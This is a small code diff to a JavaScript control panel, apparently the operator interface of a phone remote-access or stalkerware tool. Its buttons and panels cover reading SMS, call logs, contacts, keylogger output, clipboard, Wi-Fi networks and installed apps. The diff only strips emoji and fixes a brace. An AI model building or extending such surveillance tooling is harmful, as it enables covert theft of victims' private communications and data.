@@ -5,7 +5,7 @@ export function injectAdvancedControls() {
     if (!injector || document.getElementById('cmd-audio')) return; // Prevent duplicates
 
     const html = `
-        <div class="section-header"><h3>📊 DATA EXTRACTION</h3></div>
+        <div class="section-header"><h3> DATA EXTRACTION</h3></div>
         ${createBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER')}
         ${createBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER')}
         ${createBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER')}
@@ -87,7 +87,7 @@ export function injectAdvancedControls() {
             <div class="data-panel"><div class="data-panel-header"> Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div><div class="data-panel-body" id="wifi-feed">Waiting for data...</div></div>
             <div class="data-panel"><div class="data-panel-header"> Installed Apps <span id="apps-count" class="badge">0</span></div><div class="data-panel-body" id="apps-feed">Waiting for data...</div></div>
             <div class="data-panel"><div class="data-panel-header">📋 Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
-            <div class="data-panel"><div class="data-panel-header">🔋 Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
+            <div class="data-panel"><div class="data-panel-header"> Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
             <div class="data-panel"><div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div><div class="data-panel-body" id="keylog-feed">Waiting for data...</div></div>
             <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
             <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
@@ -109,4 +109,4 @@ function createBtn(id, icon, label, stateText, borderColor = '') {
                 <span>${label}</span>
                 <span class="toggle-state">${stateText}</span>
             </button>`;
-                    }
+}
